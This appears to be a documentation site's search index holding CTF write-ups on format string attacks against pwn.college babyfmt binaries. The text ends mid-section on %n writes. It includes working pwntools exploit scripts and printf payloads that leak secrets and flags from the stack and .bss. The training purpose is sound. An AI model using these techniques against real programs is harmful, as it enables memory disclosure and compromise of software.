<code>%p</code>, you can start revealing memory addresses, return addresses, and sometimes even secrets like passwords or keys.</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#understanding-argument-indexing","title":"Understanding Argument Indexing","text":"<p>Normally, <code>printf(\"%x %x %x\");</code> just walks up the stack blindly, printing whatever values are next. But in exploitation, we often want to target a specific stack argument.</p> <p>C provides argument indexing for format specifiers in the form <code>%&lt;index&gt;$&lt;specifier&gt;</code>.</p> <pre><code>6f 111 14d\n</code></pre> <p>Here:</p> <ul> <li> <p><code>%1$x</code> \u2192 first argument (<code>111</code>) in hex \u2192 <code>6f</code></p> </li> <li> <p><code>%2$x</code> \u2192 second argument (<code>222</code>) in hex \u2192 <code>111</code></p> </li> <li> <p><code>%3$x</code> \u2192 third argument (<code>333</code>) in hex \u2192 <code>14d</code></p> </li> </ul> <p>This indexing feature is extremely useful in exploitation because it allows attackers to skip directly to the argument (stack slot) they care about, instead of trial-and-error with dozens of <code>%x</code>.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#finding-offsets-with-trial-and-error","title":"Finding Offsets with Trial-and-Error","text":"<p>In real-world exploitation, the attacker doesn\u2019t know in advance where their input lies on the stack. The trick is to inject a marker string into the input and then dump the stack until it shows up.</p> <p>Attacker input:</p> <p><code>AAAAAAAA %p %p %p %p %lx %p %x %lu %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p %p %p %p %p %p %p%p %p %p %p %p %p %p</code></p> <p>Possible output:</p> <p><code>AAAAAAAA 0x7f20b1da1643 (nil) 0x7f20b1cb9574 0x25 0 0x514c455548594d45 4942524d 0 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x7ffc1d82ba30 (nil) (nil) (nil) 0x9300000010 (nil) 0x4141410000000000 0x7025204141414141 0x2520702520702520 0x702520786c252070 0x20756c25207825200x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x70252070252070250x2520702520702520 0x2570252070252070 0x2070252070252070 0x7025207025207025 0x7025207025702520 0x2520702520702520 0xa70252070252070</code></p> <p>Notice the <code>0x4141410000000000 0x7025204141414141</code> at the end \u2192 that is the ASCII hex for <code>\"AAAAAAAA\"</code>.</p> <p>This tells the attacker:</p> <ul> <li> <p>Their controlled input (<code>A</code>) is now visible on the stack.</p> </li> <li> <p>They can count how many <code>%x</code> are needed to reach it.</p> </li> <li> <p>From there, they can reliably leak or overwrite memory by adjusting the offset.</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#key-takeaways","title":"Key Takeaways","text":"<ul> <li> <p><code>%x</code> and <code>%p</code> let you dump raw values from the stack.</p> </li> <li> <p>Argument indexing (<code>%&lt;index&gt;$x</code>) makes it easy to target specific values.</p> </li> <li> <p>Trial-and-error with markers like <code>AAAA</code> helps attackers find the correct stack offset for their payloads.</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#using-lx-and-p-to-dump-stack-values","title":"Using <code>%lx</code> and <code>%p</code> to Dump Stack Values","text":"<p>When you use <code>%x</code> with <code>printf</code>, it prints values from the stack in hexadecimal format. Each <code>%x</code> consumes one argument (even if none was passed). This means <code>printf</code> will start pulling raw data from the stack.</p> <p>As vulnerable programs will use from pwn.college format string binaries.</p> <p>The first challenge babyfmt_level1.0</p> <pre><code>root@d542a6e5b47d:/host# checksec babyfmt_level1.0 \n[*] '/host/babyfmt_level1.0'\n    Arch:       amd64-64-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre> <p>The challenges always follow same pattern. Main function welcome us with some explanation and than proceeding the vulnerable method named func .</p> <p></p> <p>The vulnerable func function looks like this.</p> <ul> <li>The code is pretty simple and straight, read some string from user at 1.</li> <li>2 is the where format string vulnerability lies. The buffer directly passed to printf function. </li> <li>3 is the asking for secret value, if secret value is right its reading the flag and giving us. </li> </ul> <p>With the extra explanations and directives are great for understanding the nature of format string vulnerabilities.</p> <p>The goal leak the secret and than give it to program.</p> <p></p> <p>The address is there somewhere in the stack. All we have to do find the right spot and than deference with the %s format specifier.</p> <p></p> <p>There are several ways achieve SECRET value. So for practice you will find several script below. </p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#1-manual-way-easy","title":"1 - Manual way (Easy)","text":"<p>As mentioned earlier in 01 - Introduction to Format String Vulnerabilities, %p leak stack as integer without deference and %s format specifier deference the addresses in stack. </p> <p>The below screenshot at 22th index SECRET value pointer address. At 28th index the string first 2 byte start. But big portion of our A's is in 29th index. So the offset value is 29.</p> <p></p> <p>If i deference the stack address with %s format specifier, it turns out the SECRET value lies there. </p> <p>Todo that %22$s format specifier used. This format is simply saying deference(give me content of that address) the address at 22th index.</p> <p>After getting the secret value give back to program and get the flag.</p> <p></p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#2-leak-stack-with-pwntools","title":"2 - Leak stack with pwntools","text":"<p>Since the binary itself already giving the pointer of the address and the offset is the at 22. With these informations i can craft a simple script get me to flag.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#21-find-offset-padlen-and-numbwritten-with-the-pwntools","title":"2.1 Find offset, padlen and numbwritten with the pwntools","text":"<p>The shared script below, is brute forcing the binary and detect where user string starts and how many byte alignment needed for proper address place into stack. Numbwritten value unnecessary in this case but we can also find out how many bytes written before. </p> <p>The script uses FmtStr class for automate the process. If offset parameter not settled to this class. The init method inside of this class trigger find_offset() function to find the offset and padlen values, with this behaviour we can find easily the needed values.</p> <pre><code>from pwn import *\n\n# Load binary and configure context\nelf = context.binary = ELF('./babyfmt_level1.0', checksec=False)\ncontext.log_level = 'debug'\n\ngdbscript = '''\ncontinue\n'''\n\ndef start():\n    if args.GDB:\n        return gdb.debug([elf.path], gdbscript=gdbscript)\n    return process([elf.path])\n\n\n\n#### send helper ####\ndef send_fmt(payload):\n    io = start()\n    try:\n        io.sendafter(b'Send your data!\\n', payload)\n        data = io.recvall(timeout=0.01)\n        return data\n    finally:\n        io.close()\n\nf = FmtStr(send_fmt)\n\nsuccess(f'User input starts at  : {f.offset}')\nsuccess(f'Needed pads           :{f.padlen}')\nsuccess(f'Numbwritten           :{f.numbwritten}')\n</code></pre> <p>The result of script:</p> <p></p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#22-automate-the-process","title":"2.2 Automate the process","text":"<p>Format string vulnerabilities are a class of bugs that give the attacker arbitrary read (\u201cread-what-where\u201d) and arbitrary write (\u201cwrite-what-where\u201d) primitives.</p> <p>This means an attacker can read from or write to almost any memory address. For a read-what-where primitive, the attacker places a target address inside their input, and the format function will dereference it, effectively leaking the memory content at that location.</p> <p>I experimented with MemLeak but couldn\u2019t hack it, so I built a workaround. The custom_leak_stack function is essentially a modified version of the FmtStr.leak_stack method. While the default method only leaks addresses as integers, custom_leak_stack additionally dereferences those addresses and returns their contents as a byte string.</p> <pre><code>from pwn import *\n\n# Load binary and configure context\nelf = context.binary = ELF('./babyfmt_level1.0', checksec=False)\ncontext.log_level = 'debug'\n\ndef custom_leak_stack(f, offset, prefix=b\"\"):\n    payload = b\"START%%%d$sEND\" % offset\n    leak = f.execute_fmt(prefix + payload)\n    try:\n        leak = re.findall(br\"START(.*?)END\", leak, re.MULTILINE | re.DOTALL)[0]\n    except ValueError:\n        leak = 0\n    return leak\n\n\ngdbscript = '''\ncontinue\n'''\n\ndef start():\n    if args.GDB:\n        return gdb.debug([elf.path], gdbscript=gdbscript)\n    return process([elf.path])\n\n\nio = start()\n\n#### send helper ####\ndef send_fmt(payload):\n    io.sendafter(b'data!\\n', payload)\n    data = io.recvuntil(b'END\\n')\n    return data\n\n\nf = FmtStr(send_fmt, offset=29, padlen=3)\n\nsecret = custom_leak_stack(f, 22)\n\nsuccess(f'Secret value: {secret}')\n\n#secret_pointer = int(f.leak_stack(22))\n#info(f'Offset found at   : {f.offset}')\n#info(f'Padlen found at   : {f.padlen}')\n#info(f'Leak pointer addr : {secret_pointer:#x}')\n\nio.sendafter(b'What is the secret password?\\n', secret)\n\nio.interactive()\n</code></pre> <p>The result of the script:</p> <p></p> <p>In summary, information disclosure via format strings works by leaking stack contents (<code>%p</code>, <code>%x</code>) and then dereferencing attacker-chosen addresses (<code>%s</code>). With offset discovery and alignment, this gives a clean read-what-where primitive \u2014 the foundation for bypassing secrets and ultimately achieving arbitrary code execution.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#references","title":"References","text":"<ol> <li> <p>Format String Exploitation (Phrack 59) Scut / Team Teso (2001) http://phrack.org/issues/59/7.html</p> <p>\u2013 The classic paper that introduced format string vulnerabilities to the security community.</p> </li> <li> <p>Exploiting Format String Vulnerabilities Ulfar Erlingsson, et al. https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf</p> <p>\u2013 A detailed academic breakdown of format string bugs, exploitation techniques, and defenses.</p> </li> <li> <p>Pwntools Documentation \u2013 <code>FmtStr</code> and <code>MemLeak</code> https://docs.pwntools.com/en/stable/fmtstr.html https://docs.pwntools.com/en/stable/memleak.html</p> <p>\u2013 Official docs for the automation you used in your scripts.</p> </li> <li> <p>OWASP \u2013 Format String Attack https://owasp.org/www-community/attacks/Format_string_attack</p> <p>\u2013 A high-level overview of the attack category, aimed at developers and security testers.</p> </li> <li> <p>pwn.college \u2013 Format String Exploits https://pwn.college/software-exploitation/format-string-exploits/     \u2013 Training-oriented challenges (the same family of binaries you\u2019re using, e.g., <code>babyfmt_level1.0</code>).</p> </li> <li> <p>Shellblade: Advanced Format String Exploits (Slide deck) https://www.coresecurity.com/system/files/publications/2016/02/Corelabs-2011-Format-String.pdf</p> <p>\u2013 Great for visual learners; shows write-what-where primitives with <code>%n</code> and real-world exploitation.</p> </li> </ol>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/","title":"02 - Format String Attack - The Stack Leak 2","text":"<p>In this variant, instead of manual way, implementing some methods(steal from pwntools &lt;3) to gather SECRET value.</p> <p>In my environment the secret value placed at 7th index. You can figure out the index in your environment and than deference it.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/#get-offset-and-padlen","title":"Get offset and padlen","text":"<p>Same script I used The-Stack-Leak-1 </p> <pre><code>from pwn import *\n\n# Load binary and configure context\nelf = context.binary = ELF('./babyfmt_level2.0', checksec=False)\ncontext.log_level = 'debug'\n\ngdbscript = '''\ncontinue\n'''\n\ndef start():\n    if args.GDB:\n        return gdb.debug([elf.path], gdbscript=gdbscript)\n    return process([elf.path])\n\n#### send helper ####\ndef send_fmt(payload):\n    io = start()\n    try:\n        io.sendafter(b'Send your data!\\n', payload)\n        data = io.recvall(timeout=0.01)\n        return data\n    finally:\n        io.close()\n\nf = FmtStr(send_fmt)\n\nsuccess(f'User input starts at  : {f.offset}')\nsuccess(f'Needed pads           :{f.padlen}')\nsuccess(f'Numbwritten           :{f.numbwritten}')\n</code></pre> <p>The result:</p> <pre><code>[*] Stopped process '/host/babyfmt_level2.0' (pid 362)\n[*] Found format string offset: 29\n[+] User input starts at  : 29\n[+] Needed pads           :1\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/#get_flag","title":"Get_flag","text":"<p>Pwntools is great but not perfect. What meant is provide really useful methods and classes. But especially fmtstr.py classes and methods give me headache sometimes(format string bugs literally dead type of bugs, so understable). </p> <p>Idk maybe my knowledge gap cause of that. This way or another way pwntools great, it definitly make life easier.</p> <p>In this example,</p> <p>Can't use FmtStr class because of only support for overwrite address write(offset not acceptable, would be great). Especially padlen is so usefull. No deference support. No leak support.</p> <p>Can't use fmtstr_payload because weirdly there is no padlen parameter, So the alignment should be handled manually when need this method. Also no leak support.</p> <p>make_payload_dollar same as previous ones.</p> <p>So shared script simply doing steps as listed below,</p> <p></p> <ol> <li>The output of the program already gives the address of the secret. Getting address from the text at first.</li> <li>The offset and padlen settled and generating payload with build_payload method. This method similar to pwntools's one. Only difference format string specifier given as parameter. The address as long as known to use we can deference or leak any address from binary. In this case secret_addr is the target address.</li> <li>minileak is similar to FmtStr.leak_stack method. Only difference it returns the string directly. Not necessary but preferred this way.</li> <li>Final step sending secret back to binary and gathering the flag.</li> </ol>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/#1-payload-in-memory","title":"1. Payload in memory","text":"<pre><code>+------------------------------+\n| 'AAA'            (padlen=1)  |\n+------------------------------+\n| 'START%22$sEND'   (fmt str)  |\n+------------------------------+\n| .... some filler ....        |\n+------------------------------+\n| 0xdeadbeef (little endian)   |\n+------------------------------+\n</code></pre> <p>So the payload bytes look like:</p> <pre><code>A START%22$sEND [padding] \\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00`\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/#2-how-it-looks-on-the-stack","title":"2. How it looks on the stack","text":"<p>When the program does <code>printf(user_input)</code>:</p> <ul> <li><code>user_input</code> is copied onto the stack</li> <li><code>%22$s</code> means: \u201ctake the 22nd argument on the stack, interpret it as an address, and print the string it points to\u201d</li> </ul> <p>Stack view (simplified):</p> <pre><code>|-------------------------------|\n| saved RIP                     |\n| saved RBP                     |\n| arg1                          |\n| arg2                          |\n| ...                           |\n| arg21                         |\n| arg22  --&gt; points inside input|\n| arg23                         |\n| ...                           |\n| user_input buffer             |\n|   AAA                         |\n|   START%22$sEND               |\n|   padding                     |\n|   0xdeadbeef (the target addr)|\n|-------------------------------|\n</code></pre> <p>At runtime:</p> <ol> <li><code>printf</code> scans <code>START%22$sEND</code>.</li> <li>Sees <code>%22$s</code> \u2192 jumps to 22nd stack argument.</li> <li>That 22nd arg is our injected address (<code>0xdeadbeef</code>).</li> <li><code>printf</code> dereferences it and prints whatever string lives there.</li> </ol>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/#3-why-the-16","title":"3. Why the <code>+16</code> ?","text":"<p>The 16-byte gap comes from how arguments are stacked and how <code>printf</code> consumes them:</p> <ul> <li>The format string itself sits at <code>padlen</code></li> <li>To make sure the next argument slot aligns with an 8-byte address, pwntools puts your first pointer at <code>padlen + 16</code></li> <li>Then subsequent pointers at <code>padlen + 16 + n*8</code></li> </ul> <p>This is just to keep everything stack-aligned and predictable.</p> <pre><code>from pwn import *\n\n# Load binary and configure context\nelf = context.binary = ELF('./babyfmt_level2.0', checksec=False)\ncontext.log_level = 'info'\n\ngdbscript = '''\ncontinue\n'''\n\ndef start():\n    if args.GDB:\n        return gdb.debug([elf.path], gdbscript=gdbscript)\n    return process([elf.path])\n\n\nio = start()\n\ndef build_payload(fmt: bytes, addrs: list[int], padlen: int, filler: bytes = b\"|\") -&gt; bytes:\n    ptrsz = context.bytes\n    layout = { padlen: fmt }\n    for i, a in enumerate(addrs):\n        off = padlen + 16 + i*ptrsz\n        layout[off] = p64(a) if ptrsz == 8 else p32(a)\n    return fit(layout, filler=filler)\n\ndef minileak(leak):\n    try:\n        leak = re.findall(br\"START(.*?)END\", leak, re.MULTILINE | re.DOTALL)[0]\n    except ValueError:\n        leak = 0\n    return leak\n\n#### send helper ####\ndef send_fmt(payload):\n    io.sendafter(b'Send your data!\\n', payload)\n\n\n### get the address of secret ###\nio.recvuntil(b'you will be given the flag!\\n')\nio.recvline()\nsecret_addr = int(io.recvline().strip().split(b' ')[6],16)\n\ninfo(f'Secret address: {secret_addr:#x}')\n\n### placed at 29th offset the secret_addr ###\noffset = 29\npadlen = 1\nfmt = 'START%%%d$sEND' % (offset+16//context.bytes)\npayload = build_payload(fmt, [secret_addr], padlen=padlen)\nsend_fmt(payload)\n\n### extract secret value ###\nio.recvuntil(b'printf on your data!\\n\\n')\nleaked = io.recvline().strip()\nsecret = minileak(leaked)\n\nsuccess(f'Secret value: {secret}')\n\n### send secret and get the flag ###\nio.sendafter(b'What is the secret password?\\n', secret)\n\ntry:\n    io.recvuntil(b'Correct Password!\\n')\n    flag = io.recvline().strip()\n    io.critical(f'FLAG: {flag}')\nexcept:\n    error('Couldn\\'t hack it')\nfinally:\n    io.close()\n</code></pre> <p>The result:</p> <p></p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/#references","title":"References","text":"<ul> <li>Pwntools Documentation \u2013 FmtStr \u2013 official docs for pwntools\u2019 format string helper class.</li> <li>Pwntools Source \u2013 fmtstr.py \u2013 implementation details of how padlen, offset, and payload building are handled internally.</li> <li>pwn.college \u2013 Format String Exploits \u2013 tutorial series covering stack leaks and format string primitives.</li> <li>CWE-134: Use of Externally-Controlled Format String \u2013 official CWE entry explaining the vulnerability class.</li> <li>Exploiting Format String Vulnerabilities \u2013 scut / team teso (classic paper, 2001) \u2013 foundational paper on format string exploitation.</li> <li>LiveOverflow: Format String Exploits (YouTube series) \u2013 practical deep dive into format string exploitation with examples.</li> <li>libc printf man page \u2013 reference for format specifiers, argument indexing, and behavior.</li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/04-Format-String-Attack-The-BSS-Leak/","title":"The BSS Leak","text":"","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/04-Format-String-Attack-The-BSS-Leak/#format-string-attack-the-leak-from-bss","title":"Format String Attack - The Leak from BSS","text":"<p>Hey there, hope you are good. This variant doesn't much different from previous The-Stack-Leak-2. Same approach, only difference the flag lies somewhere in BSS.</p> <p>Like previous ones the address of flag exposed by the challenge. So only difference the getting address phase, rest is same as previous one.</p> <pre><code>&gt; ./babyfmt_level3.0 \n###\n### Welcome to ./babyfmt_level3.0!\n###\n\nThis challenge reads in some bytes, calls printf on that string, and allows you to perform\na format string attack. Through this series of challenges, you will become painfully familiar\nwith the concept of Format String Attacks!\n\nThis challenge allows you to make a 256-sized format string.\n\nThis challenge reads the flag into the .bss! Nice and easy; just read it out!\n\nSo, the flag is in the .bss. How are you going to get it?\nOne way to do it is to use %s in your format string. It will dereference a pointer\nand print the string that the pointer is pointing to. This is perfect for leaking the\nflag from the BSS!\n\nBut there's one problem... Unlike level 1, you don't have a pointer to the bss on the stack.\nThe solution? Write this address in as part of your format string, then use a positional %s (i.e.,\n%X$s with the correct X) to use that address as the pointer. That way, you have full control of\nthe address!\n\nIn this case, the address you want is 0x404140. Remember to input it in little endian! To debug what\naddress your %s will dereference, you can replace 's' with 'x' and see what the address is\nbeing interpreted at.\n\nI will now read up to 256 bytes. Send your data!\nasd\nReceived 4 bytes!\n\nI will now call printf on your data!\n\nasd\n\n### Goodbye!\n</code></pre> <p>find_offset_and_padlen.py</p> <pre><code>from pwn import *\n\n# Load binary and configure context\nelf = context.binary = ELF('./babyfmt_level3.0', checksec=False)\ncontext.log_level = 'debug'\n\ngdbscript = '''\ncontinue\n'''\n\ndef start():\n    if args.GDB:\n        return gdb.debug([elf.path], gdbscript=gdbscript)\n    return process([elf.path])\n\n#### send helper ####\ndef send_fmt(payload):\n    io = start()\n    try:\n        io.sendafter(b'Send your data!\\n', payload)\n        data = io.recvall(timeout=0.01)\n        return data\n    finally:\n        io.close()\n\nf = FmtStr(send_fmt)\n\nsuccess(f'User input starts at  : {f.offset}')\nsuccess(f'Needed pads           :{f.padlen}')\nsuccess(f'Numbwritten           :{f.numbwritten}')\n</code></pre> <p>The result:</p> <pre><code>[DEBUG] Received 0x76 bytes:\n    b'Received 33 bytes!\\n'\n    b'\\n'\n    b'I will now call printf on your data!\\n'\n    b'\\n'\n    b'aaaabaaacaaadaaaeaaaSTART0x6161616361616162END\\n'\n    b'### Goodbye!\\n'\n[*] Found format string offset: 27\n[+] User input starts at  : 27\n[+] Needed pads           :4\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/04-Format-String-Attack-The-BSS-Leak/#get_flag","title":"get_flag","text":"<p>If you are new about pwntools, i settled context.log_level='debug', so you can understand how address extracted. You can use regex also to do get the address. How lazy i am you have no idea.</p> <p>get_flag.py</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template ./babyfmt_level3.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level3.0')\ncontext.log_level = 'debug'\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\ncontinue\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Partial RELRO\n# Stack:      Canary found\n# NX:         NX enabled\n# PIE:        No PIE (0x400000)\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\n\ndef build_payload(fmt: bytes, addrs: list[int], padlen: int, filler: bytes = b\"|\") -&gt; bytes:\n    ptrsz = context.bytes\n    layout = { padlen: fmt }\n    for i, a in enumerate(addrs):\n        off = padlen + 16 + i*ptrsz\n        layout[off] = p64(a) if ptrsz == 8 else p32(a)\n    return fit(layout, filler=filler)\n\ndef minileak(leak):\n    try:\n        leak = re.findall(br\"START(.*?)END\", leak, re.MULTILINE | re.DOTALL)[0]\n    except ValueError:\n        leak = 0\n    return leak\n\nio = start()\n\n\n##### Get BSS Address from Text #####\nio.recvuntil(b'the address!\\n\\n')\nbss_addr = int(io.recvline().strip().split(b' ')[8][:-1], 16)\ninfo(f'BSS Address: {bss_addr:#x}')\n\n##### Build Payload with the known offset and padlen #####\noffset = 27\npadlen = 4\n\nfmt = f'START%%%d$sEND' % (offset+16//context.bytes)\npayload = build_payload(fmt, [bss_addr], padlen=padlen)\nio.sendafter(b'Send your data!\\n', payload)\n\ntry:\n    leak = io.recv()\n    flag = minileak(leak).strip()\n    io.critical(f'FLAG: {flag}')\nexcept:\n    error(\"Couldn't hack it\")\nfinally:\n    io.close()\n</code></pre> <p>The result:</p> <pre><code>root@e2cb00cfcebe:/host# python3 exploit.py \n[*] '/host/babyfmt_level3.0'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n[+] Starting local process '/host/babyfmt_level3.0': pid 190\n[*] BSS Address: 0x404140\n/host/exploit.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  return fit(layout, filler=filler)\n[CRITICAL] FLAG: b'pwn.college{IL-**************************************MzEzW}'\n[*] Process '/host/babyfmt_level3.0' stopped with exit code 0 (pid 190)\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/04-Format-String-Attack-The-BSS-Leak/#references","title":"References","text":"<ul> <li>man7 \u2014 printf(3) (POSIX-style positional args, <code>*m$</code>, <code>%n</code>)</li> <li>The Open Group \u2014 <code>fprintf()</code> (rule: don\u2019t mix numbered &amp; unnumbered specs)</li> <li>Linux die.net \u2014 printf(3) overview</li> <li>cppreference \u2014 <code>fprintf</code> family (width/precision basics)</li> <li>GNU C Library Manual (HTML) \u2014 libc reference</li> <li>GNU C Library Manual (PDF)</li> <li>Stack Overflow \u2014 How positional args like <code>%1$</code> work (with POSIX quote)</li> <li>Stack Overflow \u2014 Meaning of <code>%m</code> (GNU extension)</li> <li>CERT C \u2014 FIO30-C: Exclude user input from format strings</li> <li>OWASP \u2014 Format string attack</li> <li>OWASP WSTG \u2014 Testing for Format String Injection</li> <li>MITRE CWE-134 \u2014 Use of Externally-Controlled Format String</li> <li>Classic paper \u2014 \u201cExploiting Format String Vulnerabilities\u201d (scut/Team TESO)</li> <li>CTF 101 \u2014 Format String Vulnerability (intro)</li> <li>pwn.college \u2014 Format String Exploits</li> <li>CTF Cookbook \u2014 printf Leak</li> <li>Pwntools \u2014 <code>pwnlib.fmtstr</code> (FmtStr helper)</li> <li>Pwntools \u2014 <code>pwnlib.util.packing.fit</code> / <code>flat</code></li> <li>Pwntools \u2014 <code>context</code> settings (<code>context.binary</code>, <code>context.log_level</code>)</li> <li>Pwntools \u2014 tubes (I/O helpers like <code>sendafter</code>, <code>recvuntil</code>)</li> <li>Wikipedia \u2014 <code>.bss</code> section (what it is)</li> <li>LSB Refspec \u2014 ELF Special Sections (<code>.bss</code>)</li> <li>Wikipedia \u2014 Endianness (little-endian reminder)</li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/","title":"Write-What-Where - 1 byte","text":"","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#format-string-attack-write-what-where-1-byte","title":"Format String Attack - Write-What-Where - 1 byte","text":"<p>There so many format string specifiers. But there one special specifier making huge difference above all others. %n specifier comes into the play at this point.</p> <p>Here is variants of %n format string specifier</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#variants-of-n","title":"Variants of <code>%n</code>","text":"<p>Different length modifiers can be used with <code>%n</code> to control the type of the target variable:</p> Specifier Argument Type Written Value Type <code>%n</code> <code>int *</code> <code>int</code> <code>%hn</code> <code>short *</code> <code>short</code> <code>%hhn</code> <code>signed char *</code> <code>signed char</code> <code>%ln</code> <code>long *</code> <code>long</code> <code>%lln</code> <code>long long *</code> <code>long long</code> <code>%zn</code> <code>size_t *</code> <code>size_t</code> <code>%tn</code> <code>ptrdiff_t *</code> <code>ptrdiff_t</code> <code>%jn</code> <code>intmax_t *</code> <code>intmax_t</code> <p>Assume <code>\"ABCDEFG\"</code> (7 chars) is printed:</p> <ul> <li>Using <code>%n</code> with <code>int</code> (4 bytes):</li> </ul> <pre><code>Address of i \u2192 07 00 00 00\n</code></pre> <ul> <li>Using <code>%hn</code> with <code>short</code> (2 bytes):</li> </ul> <pre><code>Address of s \u2192 07 00\n</code></pre> <ul> <li>Using <code>%hhn</code> with <code>signed char</code> (1 byte):</li> </ul> <pre><code>Address of c \u2192 07\n</code></pre> <ul> <li>Using <code>%lln</code> with <code>long long</code> (8 bytes):</li> </ul> <pre><code>Address of ll \u2192 07 00 00 00 00 00 00 00\n</code></pre> <p>Attackers use <code>%hhn</code> and <code>%hn</code> a lot because they allow byte-wise or word-wise precision overwriting of memory, instead of writing a full 4 or 8 bytes at once.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#babyfmt_level40","title":"babyfmt_level4.0","text":"<p>The below variant is the perfect example for this use case.</p> <pre><code>root@5cd19b840558:/host# ./babyfmt_level4.0 \n###\n### Welcome to ./babyfmt_level4.0!\n###\n\nThis challenge reads in some bytes, calls printf on that string, and allows you to perform\na format string attack. Through this series of challenges, you will become painfully familiar\nwith the concept of Format String Attacks!\n\nThis challenge allows you to make a 256-sized format string.\n\nThis challenge requires you to set a win value, located in the .bss, to 0xa5. If you successfully\npull that off, the challenge will give you the flag! You will need to use %n to set this value\n\nThe win value in the .bss is located at 0x404170! Remember to write this in little endian in your format string.\nRemember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.\n\nI will now read up to 256 bytes. Send your data!\nasd\nReceived 4 bytes!\n\nI will now call printf on your data!\n\nasd\n\nAnd now, let's check the win value!\nChecking win value...\n... desired win value: 0xa5\n... written win value: 0\n... INCORRECT!\n### Goodbye!\n</code></pre> <p>Before start some 